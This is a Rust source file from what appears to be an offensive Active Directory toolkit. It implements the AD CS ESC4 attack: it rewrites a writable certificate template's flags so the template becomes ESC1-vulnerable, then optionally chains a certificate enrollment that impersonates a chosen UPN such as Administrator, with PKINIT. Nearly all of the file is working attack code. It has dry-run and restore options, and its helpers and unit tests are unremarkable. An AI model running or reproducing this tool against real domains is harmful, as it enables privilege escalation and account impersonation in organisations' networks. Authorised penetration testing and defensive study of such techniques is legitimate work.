//! AD CS ESC4 — weaponize a writable certificate template. Flip the two flags
//! that make a template ESC1-vulnerable, so a later `attack esc1` finishes the
//! chain by enrolling a client-auth cert with a spoofed UPN SAN.
//!
//! **1.5.1 F2 — ESC4→ESC1 in one call.** `--chain-esc1 --alt-name <UPN>` runs
//! the esc4 write, chains straight into `attack esc1` with the same auth
//! (SMB creds re-used from the LDAP bind identity), and, when `--restore`, puts
//! the template's original flags back after — leaving no persistent vuln on
//! the DC. The chain fails closed: an esc1 error still triggers `--restore`.
//!
//! Consent contract unchanged: preview by default, `--commit` to arm the write
//! (F-C2b class). `--chain-esc1` implies `--commit`.

use anyhow::{bail, Result};
use clap::Parser;

#[derive(Parser)]
pub(crate) struct Esc4Args {
    #[arg(long)]
    pub url: String,
    #[arg(long)]
    pub user: String,
    #[arg(long, default_value = "")]
    pub password: adhammer_core::SecretString,
    #[arg(long)]
    pub insecure: bool,
    /// cn of the certificate template to weaponize (e.g. `User` or a custom one).
    #[arg(long)]
    pub template: String,
    /// Optional principal (sAMAccountName / SID) to grant Enroll on the template.
    /// Omit to leave the DACL untouched and only flip the flags.
    #[arg(long)]
    pub enrollee: Option<String>,
    /// **Arm the write.** `esc4` PREVIEWS by default: it prints the flag changes it would make
    /// (leaving a persistent ESC1-vulnerable template on the DC) and returns without writing.
    /// Pass `--commit` to actually weaponize the template. Restore the original flags afterward.
    #[arg(long)]
    pub commit: bool,

    /// **F2 chain.** After weaponizing, immediately run `attack esc1` against
    /// the same DC to enroll a client-auth cert for `--alt-name`, closing the
    /// ESC4→ESC1 chain in one call. Implies `--commit`.
    #[arg(long, requires_all = ["alt_name", "ca"])]
    pub chain_esc1: bool,
    /// UPN to impersonate via the SAN on the chained `esc1` step,
    /// e.g. `Administrator@corp.local`. Required with `--chain-esc1`.
    #[arg(long, value_name = "UPN")]
    pub alt_name: Option<String>,
    /// CA name (e.g. `corp-CA`) for the chained `esc1` step. Required with `--chain-esc1`.
    #[arg(long, value_name = "NAME")]
    pub ca: Option<String>,
    /// SMB host for the chained MS-ICPR request (defaults to the LDAP `--url` host).
    #[arg(long, value_name = "HOST")]
    pub smb_host: Option<String>,
    /// NetBIOS domain for the chained SMB auth (defaults to the first DC label of the LDAP base DN).
    #[arg(long, value_name = "DOMAIN")]
    pub smb_domain: Option<String>,
    /// KDC `host[:port]` for the chained `esc1 --pkinit` (defaults to `--smb-host` / `--url` host).
    #[arg(long)]
    pub kdc: Option<String>,
    /// Also PKINIT with the issued cert as part of the chain (`esc1 --pkinit`).
    #[arg(long)]
    pub pkinit: bool,

    /// **Restore.** After the chain finishes (win or fail), write the original
    /// `msPKI-Certificate-Name-Flag` + `msPKI-Enrollment-Flag` values back —
    /// leaves no persistent ESC1 vuln on the DC. Highly recommended for auth'd
    /// engagements; opt-in so the operator can preserve the vulnerable state
    /// for follow-up work.
    #[arg(long)]
    pub restore: bool,
}

/// `attack esc4` — weaponize a certificate template we can write. Flip the two flags that make
/// a template ESC1-vulnerable: `msPKI-Certificate-Name-Flag |= ENROLLEE_SUPPLIES_SUBJECT`, and
/// `msPKI-Enrollment-Flag &= ~PEND_ALL_REQUESTS`. Optionally grant `--enrollee` an Enroll ACE.
/// After this runs, `attack esc1 --template <name> --alt-name Administrator` finishes the chain —
/// or pass `--chain-esc1 --alt-name <UPN> --ca <NAME>` to do both in one call.
pub(crate) async fn esc4(mut a: Esc4Args) -> Result<()> {
    use adhammer_collector::{Collector, LdapConfig};
    const CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT: i64 = 0x0000_0001;
    const CT_FLAG_PEND_ALL_REQUESTS: i64 = 0x0000_0002;
    a.password = crate::resolve_secret(&a.password, "ADHAMMER_PASSWORD")?;

    // --chain-esc1 implies --commit (the write must happen for esc1 to see the vulnerable state).
    if a.chain_esc1 && !a.commit {
        a.commit = true;
        crate::ui::note("--chain-esc1 implies --commit — weaponizing then chaining esc1.");
    }

    let cfg = LdapConfig {
        url: a.url.clone(),
        bind_dn: a.user.clone(),
        password: a.password.clone(),
        base_dn: None,
        insecure: a.insecure,
        gssapi: false,
        allow_plaintext_bind: false,
    };
    let mut c = Collector::connect(&cfg).await?;
    let base = c.base_dn().to_string();
    let template_dn = format!(
        "CN={},CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,{base}",
        a.template
    );

    // Read current flags, flip, write back. Replace-modify is safe because the values are
    // scalar u32-in-string form.
    let (name_flag, enroll_flag) = c.read_template_flags(&template_dn).await?;
    let new_name = name_flag | CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT;
    let new_enroll = enroll_flag & !CT_FLAG_PEND_ALL_REQUESTS;

    // Preview by default — weaponizing a template leaves a persistent ESC1 vuln on the DC.
    if !a.commit {
        crate::ui::note("preview only — no write sent. Re-run with --commit to weaponize.");
        println!(
            "[dry-run] {template_dn}: msPKI-Certificate-Name-Flag {name_flag}→{new_name} \
             (would set ENROLLEE_SUPPLIES_SUBJECT), msPKI-Enrollment-Flag {enroll_flag}→{new_enroll} \
             (would clear PEND_ALL_REQUESTS)"
        );
        return Ok(());
    }

    c.write_binary(
        &template_dn,
        "msPKI-Certificate-Name-Flag",
        new_name.to_string().into_bytes(),
    )
    .await?;
    c.write_binary(
        &template_dn,
        "msPKI-Enrollment-Flag",
        new_enroll.to_string().into_bytes(),
    )
    .await?;
    println!(
        "[+] {template_dn}: msPKI-Certificate-Name-Flag {name_flag}→{new_name} (SUPPLIES_SUBJECT), \
         msPKI-Enrollment-Flag {enroll_flag}→{new_enroll} (cleared PEND_ALL_REQUESTS)"
    );

    if let Some(enrollee) = &a.enrollee {
        eprintln!(
            "[!] --enrollee {enrollee}: Enroll-ACE write on template DACL not implemented \
                   yet — flags alone often suffice if the template is already broadly enrollable."
        );
        let mut params = crate::gap_hint::HintParams::new();
        params.template = Some(a.template.clone());
        crate::gap_hint::hint_external(crate::gap_hint::Gap::TemplateAceEdit, &params);
    }

    if !a.chain_esc1 {
        println!(
            "    → attack esc1 --template {} --alt-name Administrator",
            a.template
        );
        // Without --chain-esc1, we don't have an obvious moment to restore.
        // The operator drives the chain externally; restore is a follow-up call to their tooling.
        if a.restore {
            crate::ui::note(
                "--restore has no effect without --chain-esc1 (no chained step to fence). \
                 Run `attack esc4 --template <t>` again with the original flags to restore, or \
                 use --chain-esc1 to auto-restore after the enrollment.",
            );
        }
        return Ok(());
    }

    // ── F2 chain: esc4 → esc1 in one call ──────────────────────────────────
    let alt_name = a
        .alt_name
        .as_deref()
        .ok_or_else(|| anyhow::anyhow!("--chain-esc1 requires --alt-name <UPN>"))?;
    let ca =
        a.ca.as_deref()
            .ok_or_else(|| anyhow::anyhow!("--chain-esc1 requires --ca <NAME>"))?;
    let smb_host = a
        .smb_host
        .clone()
        .unwrap_or_else(|| host_from_ldap_url(&a.url));
    if smb_host.is_empty() {
        bail!(
            "cannot derive an SMB host from --url {}; pass --smb-host",
            a.url
        );
    }
    let smb_domain = a
        .smb_domain
        .clone()
        .or_else(|| netbios_from_base_dn(&base))
        .ok_or_else(|| {
            anyhow::anyhow!(
                "cannot derive --smb-domain from base DN {base}; pass --smb-domain explicitly"
            )
        })?;

    println!(
        "[*] chaining esc1: template={} upn={alt_name} ca={ca} smb={smb_host} domain={smb_domain}",
        a.template
    );

    let chain_result = crate::attacks::esc1::esc1(crate::attacks::esc1::Esc1Args {
        auth: crate::shared_args::SmbAuth {
            host: smb_host.clone(),
            domain: smb_domain.clone(),
            user: bare_user(&a.user),
            password: a.password.clone(),
        },
        ca: ca.to_string(),
        template: a.template.clone(),
        upn: alt_name.to_string(),
        out: "esc1.crt".to_string(),
        pkinit: a.pkinit,
        kdc: a.kdc.clone(),
    })
    .await;

    // Restore fence: happens win OR fail. We hold the pre-write values in
    // `name_flag`/`enroll_flag` — put them back so the DC ends the chain in
    // its original hardened state.
    if a.restore {
        crate::ui::note(
            "--restore: writing the template's original flags back to leave no persistent ESC1 vuln.",
        );
        // Best-effort — a restore failure prints, but doesn't override a chain error.
        let r1 = c
            .write_binary(
                &template_dn,
                "msPKI-Certificate-Name-Flag",
                name_flag.to_string().into_bytes(),
            )
            .await;
        let r2 = c
            .write_binary(
                &template_dn,
                "msPKI-Enrollment-Flag",
                enroll_flag.to_string().into_bytes(),
            )
            .await;
        match (r1, r2) {
            (Ok(_), Ok(_)) => println!(
                "[+] restored {template_dn}: msPKI-Certificate-Name-Flag→{name_flag}, msPKI-Enrollment-Flag→{enroll_flag}"
            ),
            (r1, r2) => eprintln!(
                "[!] restore FAILED — template MAY still be weaponized on the DC. \
                    Restore manually: name-flag→{name_flag}, enroll-flag→{enroll_flag}. \
                    errors: name={r1:?} enroll={r2:?}"
            ),
        }
    }

    chain_result
}

/// `ldap://dc.corp.local:389/…` → `dc.corp.local`. `ldaps://…`, port and path stripped.
/// Returns an empty string if the URL is unparseable — caller must check.
fn host_from_ldap_url(url: &str) -> String {
    let no_scheme = url
        .trim_start_matches("ldaps://")
        .trim_start_matches("ldap://");
    let host = no_scheme
        .split('/')
        .next()
        .unwrap_or("")
        .split(':')
        .next()
        .unwrap_or("");
    host.to_string()
}

/// `DC=corp,DC=local` → `CORP`. Returns None when there is no DC= component.
fn netbios_from_base_dn(base: &str) -> Option<String> {
    for part in base.split(',') {
        let p = part.trim();
        if let Some(v) = p.strip_prefix("DC=").or_else(|| p.strip_prefix("dc=")) {
            return Some(v.to_uppercase());
        }
    }
    None
}

/// `CORP\Administrator` / `Administrator@corp.local` → `Administrator`.
fn bare_user(u: &str) -> String {
    let no_at = u.split('@').next().unwrap_or(u);
    no_at.rsplit('\\').next().unwrap_or(no_at).to_string()
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn host_from_ldap_url_strips_scheme_port_path() {
        assert_eq!(
            host_from_ldap_url("ldaps://dc.corp.local:636"),
            "dc.corp.local"
        );
        assert_eq!(host_from_ldap_url("ldap://dc.corp.local"), "dc.corp.local");
        assert_eq!(host_from_ldap_url("ldap://10.0.0.1:389/foo"), "10.0.0.1");
        assert_eq!(host_from_ldap_url(""), "");
    }

    #[test]
    fn netbios_from_base_dn_finds_first_dc_upper() {
        assert_eq!(
            netbios_from_base_dn("DC=corp,DC=local"),
            Some("CORP".to_string())
        );
        assert_eq!(
            netbios_from_base_dn("CN=Users,DC=corp,DC=local"),
            Some("CORP".to_string())
        );
        assert_eq!(
            netbios_from_base_dn("dc=lower,dc=case"),
            Some("LOWER".to_string())
        );
        assert_eq!(netbios_from_base_dn("O=foo,OU=bar"), None);
    }

    #[test]
    fn bare_user_strips_realm_and_netbios_prefixes() {
        assert_eq!(bare_user("Administrator"), "Administrator");
        assert_eq!(bare_user("Administrator@corp.local"), "Administrator");
        assert_eq!(bare_user("CORP\\Administrator"), "Administrator");
        assert_eq!(bare_user("CORP\\alice@corp.local"), "alice");
    }
}
